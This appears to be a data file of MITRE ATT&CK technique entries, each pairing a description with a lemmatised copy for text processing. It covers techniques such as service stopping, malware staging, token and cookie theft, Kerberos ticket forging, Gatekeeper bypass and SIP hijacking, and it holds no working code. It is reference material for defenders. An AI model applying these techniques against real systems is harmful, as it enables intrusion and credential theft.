T1489,Service Stop,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. Adversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible",adversary stop disable service system render service unavailable legitimate user stop critical service process inhibit stop response incident aid adversary overall objective cause damage environment adversary accomplish disable individual service high importance organization msexchangeis exchange content inaccessible
T1129,Shared Modules,"Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess, LoadLibrary, etc. of the Win32 API.The module loader can load DLLs:via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory; via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension); via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs; via <file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.",adversary execute malicious payload load share module windows module loader instruct load dll arbitrary local path arbitrary universal naming convention unc network path functionality reside windows native api call function like createprocess loadlibrary etc module loader load dll specification fully qualified relative dll pathname import directory export forward dll specify fully qualified relative pathname extension ntfs junction symlink fully qualify relative pathname directory contain dll specify import directory forward export file qualified relative pathname embedded external application manifest file refer entry import directory forward use functionality way execute arbitrary payload victim system example malware execute share module load additional component feature
T1072,Software Deployment Tools,"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",adversary gain access use party software suite instal enterprise network administration monitoring deployment system laterally network party application software deployment system use network environment administration purpose sccm hbss altiris party network wide enterprise wide software system enable adversary remote code execution system connect system access laterally system gather information cause specific effect wipe hard drive endpoint permission require action vary system configuration local credential sufficient direct access party system specific domain credential require system require administrative account log perform intended purpose
T1518,Software Discovery,"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",adversary attempt listing software software version instal system cloud environment adversary use information software discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action adversary attempt enumerate software variety reason figure security measure present compromised system version software vulnerable exploitation privilege escalation
T1518.001,Software Discovery: Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.",adversary attempt listing security software configuration defensive tool sensor instal system cloud environment include thing firewall rule anti virus adversary use information security software discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action example command obtain security software information netsh reg query reg dir cmd tasklist indicator discovery behavior specific type software security system adversary look common macos malware perform check littlesnitch knockknock software adversary utilize cloud api discover configuration firewall rule environment
T1608,Stage Capabilities,"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site. Staging web resources for a link target to be used with spearphishing. Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer. Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols).",adversary upload install set capability targeting support operation adversary need capability develop develop capabilities obtain obtain capabilities stage infrastructure control capability stage infrastructure previously purchase rent adversary acquire infrastructure compromise compromise infrastructure capability stage web service github pastebin platform service paas offering enable user easily provision application staging capability aid adversary number initial access post compromise behavior include limit web resource necessary conduct drive compromise user browse site stage web resource link target spearphishing upload malware tool location accessible victim network enable ingress tool transfer instal previously acquire ssl tls certificate use encrypt command control traffic ex asymmetric cryptography web protocols
T1608.001,Stage Capabilities: Upload Malware,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.Malware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",adversary upload malware party adversary control infrastructure accessible targeting malicious software include payload dropper post compromise tool backdoor variety malicious content adversary upload malware support operation make payload available victim network enable ingress tool transfer place internet accessible web server malware place infrastructure previously purchase rent adversary acquire infrastructure compromise compromise infrastructure malware stage web service github pastebin host interplanetary file system ipfs decentralized content storage make removal malicious file difficult adversary upload backdoored file application binary virtual machine image container image party software store repository ex github cnet aws community amis docker hub chance encounter victim directly download install backdoored file user execution masquerading increase chance user mistakenly execute file
T1608.002,Stage Capabilities: Upload Tool,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.Tools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure).Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",adversary upload tool party adversary control infrastructure accessible targeting tool open closed source free commercial tool malicious purpose adversary unlike malware intend purpose ex psexec adversary upload tool support operation make tool available victim network enable ingress tool transfer place internet accessible web server tool place infrastructure previously purchase rent adversary acquire infrastructure compromise compromise avoid need upload tool have compromise victim machine download tool directly party host location ex non adversary control github repo include original hosting site tool
T1608.003,Stage Capabilities: Install Digital Certificate,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. Adversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).",adversary install ssl tls certificate targeting ssl tls certificate file instal server enable secure communication system digital certificate include information key information owner identity digital signature entity verify certificate content correct signature valid person examine certificate trust signer know use key communicate securely owner certificate upload server server configure use certificate enable encrypt communication adversary install ssl tls certificate operation encrypt traffic ex asymmetric cryptography web protocols lend credibility credential harvest site installation digital certificate place number server type include web server email server adversary obtain digital certificate digital certificates create self sign certificate digital certificates digital certificate instal adversary control infrastructure acquire acquire infrastructure previously compromise compromise infrastructure
T1608.004,Stage Capabilities: Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).Adversaries may upload or inject malicious web content, such as JavaScript, into websites. This may be done in a number of ways, including:Inserting malicious scripts into web pages or other user controllable web content such as forum posts Modifying script files served to websites from publicly writeable cloud storage buckets Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., Malvertising)In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in Gather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation.Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.",adversary prepare operational environment infect system visit website normal course browsing endpoint system compromise browse adversary control site drive compromise case user web browser typically target exploitation require extra user interaction land site adversary set website non exploitation behavior application access token prior drive compromise adversary stage resource need deliver exploit user browse adversary control site drive content stage adversary control infrastructure acquire acquire infrastructure previously compromise compromise upload inject malicious web content javascript website number way include insert malicious script web page user controllable web content forum post modify script file serve website publicly writeable cloud storage bucket craft malicious web advertisement purchase ad space website legitimate ad provider addition stage content exploit user web browser adversary stage script content profile user browser gather victim host information ensure vulnerable prior attempt exploitation website compromise adversary stage drive one visit specific community government particular industry region goal compromise specific user set user base share interest kind target campaign refer strategic web compromise watering hole attack adversary purchase domain similar legitimate domain ex homoglyph typosquatting different level domain etc acquisition infrastructure domain help facilitate drive compromise
T1608.005,Stage Capabilities: Link Target,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. Typically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link. Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.",adversary place resource reference link targeting adversary rely user click malicious link order divulge information include credential gain execution malicious link link spearphishing send email accompany social engineering text coax user actively click copy paste url browser prior phish information spearphishing link phish gain initial access system spearphishing link adversary set resource link target spearphishing link typically resource link target html page include client script javascript decide content serve user adversary clone legitimate site serve link target include cloning login page legitimate web service organization login page effort harvest credential spearphishing link adversary upload malware link target point malware download execution user adversary purchase domain similar legitimate domain ex homoglyph typosquatting different level domain etc acquisition infrastructure domain help facilitate malicious link link shorten service employ adversary use free pay account platform service provider host link target take advantage widely trust domain provider avoid block
T1608.006,Stage Capabilities: SEO Poisoning,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.To help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.",adversary poison mechanism influence search engine optimization seo lure stage capability potential victim search engine typically display result user base purchase ad site ranking score reputation calculate web crawler algorithm help facilitate drive compromise adversary stage content explicitly manipulate seo ranking order promote site host malicious payload drive target search engine poison seo ranking involve trick stuff keyword include form hidden text compromise site keyword relate interest browsing habit intended broad seasonably popular topic election trend purchase plant incoming link stage capability order boost site calculated relevance reputation seo poisoning combine evasive redirect cloaking mechanism measure mouse movement serve content base browser user agent user language localization setting http header order feed seo input avoid scrutiny defender
T1528,Steal Application Access Token,"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.Token theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.",adversary steal application access token means acquire credential access remote system resource application access token authorized api request behalf user service commonly way access resource cloud container base application software service saas oauth commonly implement framework issue token user access system adversary steal account api token cloud containerized environment able access datum perform action permission account lead privilege escalation compromise environment kubernetes environment process run inside container communicate kubernetes api server service account token container compromise attacker able steal container token gain access kubernetes api command token theft occur social engineering case user action require grant access application desire access cloud base service protect api gain entry oauth variety authorization protocol example commonly sequence microsoft authorization code grant flow oauth access token enable party application interact resource contain user datum way request application obtain user credential adversary leverage oauth authorization construct malicious application design grant access resource target user oauth token application access token function limited lifetime limit long adversary utilize steal token case adversary steal application refresh token allow obtain new access token prompt user
T1649,Steal or Forge Authentication Certificates,"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)Abusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as ""golden"" certificates).",adversary steal forge certificate authentication access remote system resource digital certificate sign encrypt message file certificate authentication material example azure ad device certificate active directory certificate services ad cs certificate bind identity credential domain account authentication certificate steal forge example ad cs certificate steal encrypt storage registry certificate authentication credential enable behavior lateral movement certificate relate misconfiguration enable opportunity privilege escalation way allow user impersonate assume privileged account permission identity san associate certificate abuse enable persistence steal forge certificate valid accounts duration certificate validity despite user password reset authentication certificate steal forge machine account adversary access root subordinate certificate private key mechanism protect manage key establish persistence forge arbitrary authentication certificate victim domain know golden certificate
T1558,Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as ""realms"", there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting. Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.",adversary attempt subvert kerberos authentication steal forge kerberos ticket enable pass ticket kerberos authentication protocol widely modern windows domain environment kerberos environment refer realm basic participant client service key distribution center kdc client request access service exchange kerberos ticket originate kdc grant access having successfully authenticate kdc responsible authentication ticket granting adversary attempt abuse kerberos steal ticket forge ticket enable unauthorized access windows build klist utility list analyze cache kerberos ticket linux system active directory domain store kerberos credential locally credential cache file refer ccache credential store ccache file remain valid generally user session last kerberos ticket macos store standard ccache format similar linux default access ccache entry federate kcm daemon process mach rpc protocol use caller environment determine access storage location ccache entry influence configuration file environment variable specify save disk protect kcm daemon user interact ticket storage kinit klist ktutil kcc build binary apple native kerberos framework adversary use open source tool interact ccache file directly use kerberos framework low level api extract user tgt service ticket
T1558.001,Steal or Forge Kerberos Tickets: Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",adversary krbtgt account password hash forge kerberos ticket grant ticket tgt know golden ticket golden ticket adversary able request ticket grant service tgs ticket enable access specific resource golden ticket require adversary interact key distribution center kdc order obtain kdc service run domain controller active directory domain krbtgt kerberos key distribution center kdc service account responsible encrypt sign kerberos ticket krbtgt password hash obtain os credential dumping privileged access domain controller
T1558.002,Steal or Forge Kerberos Tickets: Silver Ticket,"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.Password hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",adversary password hash target service account sharepoint mssql forge kerberos ticket grant service tgs ticket know silver ticket kerberos tgs ticket know service ticket silver ticket limited scope golden ticket enable adversary access particular resource mssql system host resource unlike golden ticket adversary ability forge silver ticket able create tgs ticket interact key distribution center kdc potentially make detection difficult password hash target service obtain os credential dumping kerberoasting
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a serviceAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).This same behavior could be executed using service tickets captured from network traffic.Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",adversary abuse valid kerberos ticket grant ticket tgt sniff network traffic obtain ticket grant service tgs ticket vulnerable brute force service principal name spns uniquely identify instance windows service enable authentication kerberos require spn associate service logon account account specifically task run serviceadversarie possess valid kerberos ticket grant ticket tgt request kerberos ticket grant service tgs service ticket spn domain controller behavior execute service ticket capture network traffic crack hash enable persistence privilege escalation lateral movement access valid accounts
T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. Preauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials. An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",adversary reveal credential account disable kerberos preauthentication password cracking kerberos message preauthentication offer protection offline password cracking enable user request access resource initiate communication domain controller dc send authentication server request req message timestamp encrypt hash password dc able successfully decrypt timestamp hash user password send authentication server response rep message contain ticket granting ticket tgt user rep message sign user password account find preauthentication adversary send req message encrypt timestamp receive rep message tgt datum encrypt insecure algorithm recover encrypt datum vulnerable offline password cracking attack similarly kerberoasting expose plaintext credential account register domain special privilege abuse list domain account preauthentication disable utilize windows tool like powershell ldap filter alternatively adversary send req message user dc respond error account require preauthentication rep message contain encrypt datum crack hash enable persistence privilege escalation lateral movement access valid accounts
T1539,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.There are several examples of malware targeting cookies from web browsers on the local system.After an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.",adversary steal web application service session cookie use gain access web application internet service authenticated user need credential web application service use session cookie authentication token user authenticate website cookie valid extended period time web application actively cookie find disk process memory browser network traffic remote system additionally application target machine store sensitive authentication cookie memory app authenticate cloud service session cookie bypasses multi factor authentication protocol example malware target cookie web browser local system adversary acquire valid cookie perform web session cookie technique login corresponding web application
T1553,Subvert Trust Controls,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls.",adversary undermine security control warn user untrusted activity prevent execution untrusted program operate system security product contain mechanism identify program website possess level trust example feature include program allow run sign valid code signing certificate program prompt user warning attribute set download internet get indication connect untrusted site adversary attempt subvert trust mechanism method adversary use depend specific mechanism seek subvert adversary conduct file directory permission modification modify registry support subvert control
T1553.001,Subvert Trust Controls: Gatekeeper Bypass,"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.Based on an opt-in system, when files are downloaded an extended attribute (xattr) called com.apple.quarantine (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.Notarization - Using the api.apple-cloudkit.com API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an ""unauthorized app"" and the security policy will be modified.Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.",adversary modify file attribute subvert gatekeeper functionality evade user prompt execute untrusted program gatekeeper set technology act layer apple security model ensure trusted application execute host gatekeeper build file quarantine snow leopard grow include code signing security policy compliance notarization gatekeeper treat application run time differently reopen application base opt system file download extended attribute xattr call know quarantine flag set file application perform download launch services open application suspend state run application quarantine flag set gatekeeper execute following function check extend attribute gatekeeper check quarantine flag provide alert prompt user allow deny execution checks system policy gatekeeper check system security policy allow execution app download app store app store identify developer code signing gatekeeper check valid code signature apple developer api gatekeeper reach apple server verify pull notarization ticket ensure ticket revoke user override notarization result prompt execute unauthorized app security policy modify adversary subvert multiple security control gatekeeper check logic error exploitation defense evasion unchecked file type external library example prior macos ventura code signing notarization check conduct launch allow adversary write malicious executable previously open application order bypass gatekeeper security check application file load system usb flash drive optical disk external hard drive drive share local network curl command set quarantine flag additionally possible avoid set quarantine flag drive compromise
T1553.002,Subvert Trust Controls: Code Signing,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Unlike Invalid Code Signature, this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",adversary create acquire steal code signing material sign malware tool code signing provide level authenticity binary developer guarantee binary tamper unlike invalid code signature activity result valid signature code signing verify software run modern windows macos system linux decentralized nature platform code signing certificate bypass security policy require sign code execute system
T1553.003,Subvert Trust Controls: SIP and Trust Provider Hijacking,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. Modifying the DLL and Function Registry values in HKLM\SOFTWAREMicrosoft\Cryptography\Providers\Trust\FinalPolicy{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex). Note: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.",adversary tamper sip trust provider component mislead operate system application control tool conduct signature validation check user mode windows authenticode vary executable file type corresponding signature format microsoft create software component call subject interface packages sips similar code signing adversary abuse architecture subvert trust control bypass security 